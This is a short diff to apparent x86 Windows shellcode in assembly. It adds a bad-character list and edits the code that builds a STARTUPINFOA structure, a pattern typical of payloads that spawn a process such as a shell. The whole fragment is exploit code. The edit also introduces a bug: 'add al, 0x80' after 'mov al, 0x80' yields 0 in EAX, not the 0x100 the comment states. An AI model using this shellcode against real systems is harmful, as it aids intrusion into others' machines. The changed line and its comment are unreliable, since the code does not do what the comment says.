@@ -1,4 +1,6 @@
- start:                            
+badchars = b"\x00\x02\x0A\x0D"
+
+start:                            
 #    int3;                             # Set bp in Windbg. REMOVE WHEN NOT DEBUGGING!
     mov   ebp, esp;                   # Simulate start of function call (set new base as current top of stack)
     add   esp, 0xfffff9f0;            # Decrement esp to provide space for the frame (avoid NULL bytes)
@@ -192,7 +194,7 @@ create_startupinfoa:                #
     push  eax;                        # lpReserved2 = NULL
     push  eax;                        # cbReserved2 & wShowWindow = NULL
     mov   al, 0x80;                   # EAX = 0x80
-    add   eax, 0x80;                  # EAX = 0x100
+    add   al, 0x80;                   # EAX = 0x100
     push  eax;                        # dwFlags = 0x100
     xor   eax, eax;                   # Null EAX
     push  eax;                        # dwFillAttribute = NULL
